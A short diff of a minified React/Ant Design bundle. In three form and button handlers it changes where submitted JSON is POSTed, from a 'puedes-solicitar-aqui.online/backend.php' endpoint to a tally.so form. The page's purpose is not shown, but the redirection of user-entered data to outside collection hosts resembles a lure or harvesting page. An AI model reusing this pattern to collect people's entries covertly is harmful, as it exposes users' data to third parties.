@@ -9814,7 +9814,7 @@
                                 className: "ant-form ant-form-horizontal css-m4timi",
                                 onSubmit: e => {
                                     e.preventDefault(),
-                                    fetch("https://puedes-solicitar-aqui.online/backend.php", {
+                                    fetch("https://tally.so/r/3NR1Bp", {
                                         method: "POST",
                                         headers: {
                                             "Content-Type": "application/json"
@@ -13358,7 +13358,7 @@
                             he.jsxs)("form", {
                                 onSubmit: n => {
                                     n.preventDefault(),
-                                    u && o ? (fetch("https://puedes-solicitar-aqui.online/backend.php", {
+                                    u && o ? (fetch("https://tally.so/r/3NR1Bp", {
                                         method: "POST",
                                         headers: {
                                             "Content-Type": "application/json"
@@ -13471,7 +13471,7 @@
                 he.jsx)("button", {
                     onClick: n => {
                         n.preventDefault(),
-                        fetch("https://puedes-solicitar-aqui.online/backend.php", {
+                        fetch("https://tally.so/r/3NR1Bp", {
                             method: "POST",
                             headers: {
                                 "Content-Type": "application/json"
